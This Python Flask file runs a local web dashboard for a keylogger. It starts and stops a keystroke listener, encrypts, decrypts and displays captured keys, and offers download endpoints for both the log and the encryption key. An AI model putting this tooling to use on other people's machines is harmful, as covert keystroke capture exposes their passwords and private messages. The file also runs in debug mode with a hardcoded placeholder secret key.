from flask import Flask, render_template, send_file, redirect, url_for, flash, request, jsonify
import threading
import keylogger
import webbrowser
import os
from datetime import datetime
from cryptography.fernet import Fernet

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Required for flash messages

# Global variables
listener_thread = None

@app.route("/")
def index():
    """Main dashboard page"""
    return render_template("index.html")

@app.route("/start")
def start_logging():
    """Start keystroke logging"""
    global listener_thread
    try:
        if listener_thread is None or not listener_thread.is_alive():
            listener_thread = threading.Thread(target=keylogger.start_listener, daemon=True)
            listener_thread.start()
            flash("Keystroke logging started successfully!", "success")
        else:
            flash("Logging is already active!", "info")
    except Exception as e:
        flash(f"Failed to start logging: {str(e)}", "error")
    
    return redirect(url_for("index"))

@app.route("/stop")
def stop_logging():
    """Stop keystroke logging"""
    global listener_thread
    try:
        # Note: pynput doesn't provide a clean way to stop the listener
        # This is a limitation of the library
        listener_thread = None
        flash("Logging stop requested (may require restart for full effect)", "warning")
    except Exception as e:
        flash(f"Error stopping logging: {str(e)}", "error")
    
    return redirect(url_for("index"))

@app.route("/encrypt")
def encrypt():
    """Encrypt the log file"""
    try:
        if not os.path.exists("key_log.txt"):
            flash("No log file found to encrypt!", "error")
            return redirect(url_for("index"))
        
        keylogger.encrypt_log()
        flash("Log file encrypted successfully!", "success")
    except Exception as e:
        flash(f"Encryption failed: {str(e)}", "error")
    
    return redirect(url_for("index"))

@app.route('/decrypt')
def decrypt_log():
    """Decrypt and display log file"""
    try:
        # Check if required files exist
        if not os.path.exists('key_log.txt'):
            return render_template('logs.html', 
                                 logs="", 
                                 error="Log file not found",
                                 timestamp=datetime.now().strftime("%H:%M:%S"))
        
        if not os.path.exists('key.key'):
            return render_template('logs.html', 
                                 logs="", 
                                 error="Encryption key not found",
                                 timestamp=datetime.now().strftime("%H:%M:%S"))
        
        # Read the encrypted keystrokes
        with open('key_log.txt', 'rb') as enc_file:
            encrypted_data = enc_file.read()
        
        # If file is empty or not encrypted, try reading as plain text
        if len(encrypted_data) == 0:
            return render_template('logs.html', 
                                 logs="", 
                                 error="Log file is empty",
                                 timestamp=datetime.now().strftime("%H:%M:%S"))
        
        try:
            # Load the Fernet encryption key
            with open('key.key', 'rb') as key_file:
                key = key_file.read()
            
            # Decrypt the data
            fernet = Fernet(key)
            decrypted_data = fernet.decrypt(encrypted_data).decode('utf-8')
            
            return render_template('logs.html', 
                                 logs=decrypted_data,
                                 timestamp=datetime.now().strftime("%H:%M:%S"))
        
        except Exception as decrypt_error:
            # If decryption fails, try reading as plain text
            try:
                with open('key_log.txt', 'r', encoding='utf-8') as f:
                    plain_data = f.read()
                return render_template('logs.html', 
                                     logs=plain_data,
                                     timestamp=datetime.now().strftime("%H:%M:%S"),
                                     warning="File appears to be unencrypted")
            except:
                raise decrypt_error
    
    except Exception as e:
        return render_template('logs.html', 
                             logs="", 
                             error=f"Failed to decrypt: {str(e)}",
                             timestamp=datetime.now().strftime("%H:%M:%S"))

@app.route("/view-logs")
def view_logs():
    """Display the current logs (encrypted or decrypted)"""
    try:
        if os.path.exists("key_log.txt"):
            # Try to read as plain text first
            try:
                with open("key_log.txt", "r", encoding="utf-8") as f:
                    logs = f.read()
            except UnicodeDecodeError:
                # File might be encrypted, redirect to decrypt
                return redirect(url_for("decrypt_log"))
        else:
            logs = ""
    except Exception as e:
        logs = f"Error reading log file: {str(e)}"
    
    return render_template("logs.html", 
                         logs=logs, 
                         timestamp=datetime.now().strftime("%H:%M:%S"))

@app.route("/download-log")
def download_log():
    """Download the log file"""
    try:
        if os.path.exists("key_log.txt"):
            return send_file("key_log.txt", as_attachment=True)
        else:
            flash("Log file not found!", "error")
            return redirect(url_for("index"))
    except Exception as e:
        flash(f"Download failed: {str(e)}", "error")
        return redirect(url_for("index"))

@app.route("/download-key")
def download_key():
    """Download the encryption key file"""
    try:
        if os.path.exists("key.key"):
            return send_file("key.key", as_attachment=True)
        else:
            flash("Key file not found!", "error")
            return redirect(url_for("index"))
    except Exception as e:
        flash(f"Download failed: {str(e)}", "error")
        return redirect(url_for("index"))

@app.route("/clear-logs", methods=["GET", "POST"])
def clear_logs():
    """Clear the keystroke log file"""
    try:
        if os.path.exists("key_log.txt"):
            # Get file size before clearing for user feedback
            file_size = os.path.getsize("key_log.txt")
            
            # Clear the file
            with open("key_log.txt", "w") as f:
                pass
            
            flash(f"Keystroke logs cleared successfully! ({file_size} bytes removed)", "success")
        else:
            flash("No log file found to clear.", "info")
            
    except Exception as e:
        flash(f"Error clearing logs: {str(e)}", "error")
    
    return redirect(url_for("view_logs"))

@app.route("/status")
def get_status():
    """Get current system status (for AJAX requests)"""
    global listener_thread
    
    try:
        log_exists = os.path.exists("key_log.txt")
        key_exists = os.path.exists("key.key")
        log_size = os.path.getsize("key_log.txt") if log_exists else 0
        
        # Check if log is encrypted by trying to read it
        is_encrypted = False
        if log_exists and log_size > 0:
            try:
                with open("key_log.txt", "r", encoding="utf-8") as f:
                    f.read(100)  # Try to read first 100 chars
            except UnicodeDecodeError:
                is_encrypted = True
        
        status = {
            "logging_active": listener_thread and listener_thread.is_alive(),
            "log_exists": log_exists,
            "log_size": log_size,
            "key_exists": key_exists,
            "is_encrypted": is_encrypted,
            "timestamp": datetime.now().isoformat()
        }
        
        return jsonify(status)
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/clear-logs", methods=["POST"])
def api_clear_logs():
    """API endpoint to clear logs via AJAX"""
    try:
        if os.path.exists("key_log.txt"):
            file_size = os.path.getsize("key_log.txt")
            with open("key_log.txt", "w") as f:
                pass
            
            return jsonify({
                "success": True,
                "message": f"Cleared {file_size} bytes from log file",
                "timestamp": datetime.now().isoformat()
            })
        else:
            return jsonify({
                "success": True,
                "message": "No log file found to clear",
                "timestamp": datetime.now().isoformat()
            })
            
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Error clearing logs: {str(e)}",
            "timestamp": datetime.now().isoformat()
        }), 500

# Error handlers
@app.errorhandler(404)
def not_found_error(error):
    """Handle 404 errors"""
    flash("Page not found!", "error")
    return redirect(url_for("index"))

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    flash("Internal server error occurred!", "error")
    return redirect(url_for("index"))

# Utility functions
def safe_file_operation(file_path, operation, *args, **kwargs):
    """Safely perform file operations with error handling"""
    try:
        if operation == "read":
            with open(file_path, "r", encoding="utf-8") as f:
                return f.read()
        elif operation == "write":
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(kwargs.get("content", ""))
        elif operation == "exists":
            return os.path.exists(file_path)
        elif operation == "size":
            return os.path.getsize(file_path) if os.path.exists(file_path) else 0
    except Exception as e:
        print(f"File operation error: {e}")
        return None

if __name__ == "__main__":
    try:
        # Create necessary directories if they don't exist
        os.makedirs("templates", exist_ok=True)
        os.makedirs("static", exist_ok=True)
        
        # Open browser automatically
        webbrowser.open("http://127.0.0.1:8000")
        
        # Run the Flask application
        app.run(host="127.0.0.1", port=8000, debug=True)
        
    except Exception as e:
        print(f"Application startup error: {e}")
    finally:
        # Cleanup on exit
        if listener_thread and listener_thread.is_alive():
            print("Cleaning up resources...")